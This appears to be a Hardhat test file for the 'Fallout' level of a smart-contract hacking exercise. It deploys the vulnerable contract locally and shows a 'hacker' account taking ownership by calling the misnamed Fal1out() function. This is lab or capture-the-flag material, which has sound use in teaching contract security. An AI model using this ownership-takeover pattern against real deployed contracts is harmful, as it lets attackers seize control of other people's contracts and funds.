import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 02 - Fallout contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();
        const FalloutContract = await ethers.getContractFactory("Fallout");
        const fallout = await FalloutContract.deploy();

        return {owner, hacker, fallout};
    };

    describe("When deploying", () => {
        it("No owner should be set at deployment", async() => {
            const {owner, hacker, fallout} = await loadFixture(setUp);
            expect(await fallout.owner()).to.equal(ethers.ZeroAddress);
        });
    });

    describe("When hacking", () => {
        it("Owner should be the hacker account after calling the Fal1out() function", async() => {
            const {owner, hacker, fallout} = await loadFixture(setUp);
            
            await fallout.connect(hacker).Fal1out({value: BigInt(0)});
            expect(await fallout.owner()).to.equal(hacker.address);
            // Now the hacker is the contract's owner.
        });
    });
});